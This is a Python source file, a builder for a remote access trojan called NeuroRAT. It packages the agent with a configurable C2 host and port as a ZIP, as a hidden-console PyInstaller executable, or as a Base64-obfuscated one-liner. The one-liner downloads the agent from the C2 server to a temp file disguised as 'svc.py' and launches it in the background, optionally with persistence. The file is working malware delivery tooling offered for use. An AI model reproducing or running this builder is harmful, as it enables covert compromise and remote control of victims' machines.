#!/usr/bin/env python3
"""
NeuroRAT Agent Builder
Utility to package the NeuroRAT agent for deployment
"""

import os
import sys
import shutil
import argparse
import tempfile
import zipfile
import base64
import importlib.util
import subprocess
import platform
from typing import List, Dict, Any, Optional, Tuple

def check_requirements() -> bool:
    """Check if required packages are installed"""
    required_packages = ["cryptography", "requests"]
    missing_packages = []
    
    for package in required_packages:
        if importlib.util.find_spec(package) is None:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"Missing required packages: {', '.join(missing_packages)}")
        print("Please install them using: pip install " + " ".join(missing_packages))
        return False
    
    return True

def check_pyinstaller() -> bool:
    """Check if PyInstaller is installed"""
    try:
        subprocess.check_output(["pyinstaller", "--version"], stderr=subprocess.STDOUT)
        return True
    except (subprocess.SubprocessError, FileNotFoundError):
        print("PyInstaller not found. Please install it using: pip install pyinstaller")
        return False

def create_zip_package(output_path: str, server_host: str, server_port: int, 
                      with_persistence: bool = False) -> str:
    """
    Create a ZIP package with the agent files
    
    Args:
        output_path: Path to save the ZIP file
        server_host: C2 server host
        server_port: C2 server port
        with_persistence: Whether to enable persistence
    
    Returns:
        Path to the created ZIP file
    """
    print(f"Creating ZIP package with server {server_host}:{server_port}...")
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    try:
        # Copy required files
        files_to_copy = [
            "neurorat_agent.py",
            "llm_processor.py",
            "neurorat_launcher.py",
            "README.md"
        ]
        
        for file in files_to_copy:
            if os.path.exists(file):
                shutil.copy2(file, temp_dir)
        
        # Copy agent_protocol directory
        if os.path.exists("agent_protocol") and os.path.isdir("agent_protocol"):
            shutil.copytree("agent_protocol", os.path.join(temp_dir, "agent_protocol"))
        
        # Copy agent_modules directory
        if os.path.exists("agent_modules") and os.path.isdir("agent_modules"):
            shutil.copytree("agent_modules", os.path.join(temp_dir, "agent_modules"))
        
        # Create a launcher script
        launcher_path = os.path.join(temp_dir, "launch.py")
        with open(launcher_path, 'w') as f:
            persistence_arg = ', "--persistence"' if with_persistence else ''
            f.write(f'''#!/usr/bin/env python3
import os
import sys
import subprocess

# Add the current directory to sys.path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import the launcher
from neurorat_launcher import main

# Set arguments for the launcher
sys.argv = ["neurorat_launcher.py", "run", "--server", "{server_host}", "--port", "{server_port}"{persistence_arg}]

# Run the launcher
if __name__ == "__main__":
    main()
''')
        
        # Create a basic batch file for Windows
        batch_path = os.path.join(temp_dir, "launch.bat")
        with open(batch_path, 'w') as f:
            f.write(f"@echo off\npython launch.py\n")
        
        # Create a basic shell script for Unix
        shell_path = os.path.join(temp_dir, "launch.sh")
        with open(shell_path, 'w') as f:
            f.write(f"#!/bin/bash\npython3 launch.py\n")
        os.chmod(shell_path, 0o755)
        
        # Create a ZIP file
        if not output_path.endswith(".zip"):
            output_path += ".zip"
        
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
        
        print(f"ZIP package created: {output_path}")
        return output_path
        
    finally:
        # Clean up the temporary directory
        shutil.rmtree(temp_dir)

def build_executable(output_path: str, server_host: str, server_port: int,
                    with_persistence: bool = False) -> str:
    """
    Build an executable using PyInstaller
    
    Args:
        output_path: Path to save the executable
        server_host: C2 server host
        server_port: C2 server port
        with_persistence: Whether to enable persistence
    
    Returns:
        Path to the created executable
    """
    if not check_pyinstaller():
        return ""
    
    print(f"Building executable with server {server_host}:{server_port}...")
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    try:
        # Create a launcher script
        launcher_path = os.path.join(temp_dir, "launcher.py")
        with open(launcher_path, 'w') as f:
            f.write(f"""#!/usr/bin/env python3
import os
import sys
import time

# Required to find the modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import the agent
from neurorat_agent import NeuroRATAgent

# Create and start the agent
def main():
    agent = NeuroRATAgent(
        server_host="{server_host}",
        server_port={server_port},
        persistence={str(with_persistence).lower()}
    )
    
    try:
        # Start the agent
        agent.start()
        
        # Keep the main thread running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        agent.stop()

if __name__ == "__main__":
    main()
""")
        
        # Copy required files
        files_to_copy = [
            "neurorat_agent.py", 
            "llm_processor.py"
        ]
        
        for file in files_to_copy:
            if os.path.exists(file):
                shutil.copy2(file, temp_dir)
        
        # Copy agent_protocol directory
        if os.path.exists("agent_protocol") and os.path.isdir("agent_protocol"):
            shutil.copytree("agent_protocol", os.path.join(temp_dir, "agent_protocol"))
        
        # Copy agent_modules directory if it exists
        if os.path.exists("agent_modules") and os.path.isdir("agent_modules"):
            shutil.copytree("agent_modules", os.path.join(temp_dir, "agent_modules"))
        
        # Set options based on platform
        is_windows = platform.system() == "Windows"
        
        # Build the executable
        os.chdir(temp_dir)
        
        pyinstaller_options = [
            "--onefile",
            "--noconsole" if is_windows else "",
            "--name", os.path.basename(output_path) if output_path else "neurorat_agent",
            "launcher.py"
        ]
        
        # Filter out empty options
        pyinstaller_options = [opt for opt in pyinstaller_options if opt]
        
        # Run PyInstaller
        subprocess.check_call(["pyinstaller"] + pyinstaller_options)
        
        # Get the path to the executable
        dist_dir = os.path.join(temp_dir, "dist")
        exe_name = os.path.basename(output_path) if output_path else "neurorat_agent"
        if is_windows:
            exe_name += ".exe"
        
        executable_path = os.path.join(dist_dir, exe_name)
        
        # Copy to output path if specified
        if output_path:
            output_dir = os.path.dirname(output_path)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # Add .exe extension on Windows if missing
            if is_windows and not output_path.endswith(".exe"):
                output_path += ".exe"
            
            shutil.copy2(executable_path, output_path)
            executable_path = output_path
        
        print(f"Executable built: {executable_path}")
        return executable_path
        
    finally:
        # Clean up the temporary directory
        shutil.rmtree(temp_dir)

def generate_base64_loader(server_host: str, server_port: int, 
                         with_persistence: bool = False) -> str:
    """
    Generate a Base64-encoded one-liner loader
    
    Args:
        server_host: C2 server host
        server_port: C2 server port
        with_persistence: Whether to enable persistence
    
    Returns:
        Base64-encoded one-liner
    """
    print(f"Generating Base64 one-liner with server {server_host}:{server_port}...")
    
    # Python code for the agent
    python_code = f"""
import os,sys,time,uuid,socket,platform,subprocess,threading,base64
import urllib.request as request

# Define parameters directly in the executed code
_server_host = \"{server_host}\"
_server_port = {server_port}
_with_persistence = {with_persistence}

# Download agent
def dl():
    try:
        # Download agent code using defined parameters
        u = f\"http://{{_server_host}}:{{_server_port}}/dl/neurorat_agent.py\" # Use f-string with embedded vars
        r = request.urlopen(u).read()
        
        # Save to temp file
        p = os.path.join(os.environ.get('TEMP', '/tmp'), \"svc.py\")
        with open(p, 'wb') as f:
            f.write(r)
        
        # Run agent using embedded vars
        args_list = [sys.executable, p, \"--server\", _server_host, \"--port\", str(_server_port)]
        if _with_persistence:
            args_list.append(\"--persistence\")
        subprocess.Popen(args_list)

    except Exception as e:
        pass # Consider logging the exception here

# Run in background
threading.Thread(target=dl).start()
"""
    
    # Encode to Base64
    encoded = base64.b64encode(python_code.encode()).decode()
    
    # Create one-liner using python3 and single quotes for the -c command
    one_liner = f'python3 -c \'import base64,sys;exec(base64.b64decode("{encoded}").decode())\''
    
    print(f"Base64 one-liner generated ({{len(one_liner)}} chars)")
    return one_liner

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="NeuroRAT Agent Builder")
    parser.add_argument("--server", required=True, help="C2 server host")
    parser.add_argument("--port", type=int, default=8000, help="C2 server port")
    parser.add_argument("--output", default="build", help="Output path")
    parser.add_argument("--persistence", action="store_true", help="Enable persistence")
    parser.add_argument("--type", choices=["zip", "exe", "base64", "all"], default="zip",
                      help="Type of package to build")
    
    args = parser.parse_args()
    
    # Check requirements
    if not check_requirements():
        sys.exit(1)
    
    # Create output directory if it doesn't exist
    output_dir = os.path.dirname(args.output)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Build the specified package type
    if args.type == "zip" or args.type == "all":
        create_zip_package(args.output, args.server, args.port, args.persistence)
    
    if args.type == "exe" or args.type == "all":
        build_executable(args.output, args.server, args.port, args.persistence)
    
    if args.type == "base64" or args.type == "all":
        one_liner = generate_base64_loader(args.server, args.port, args.persistence)
        
        # Save to file
        base64_file = args.output + ".b64.txt" if not args.output.endswith(".txt") else args.output
        with open(base64_file, 'w') as f:
            f.write(one_liner)
        
        print(f"Base64 one-liner saved to {base64_file}")

if __name__ == "__main__":
    main() 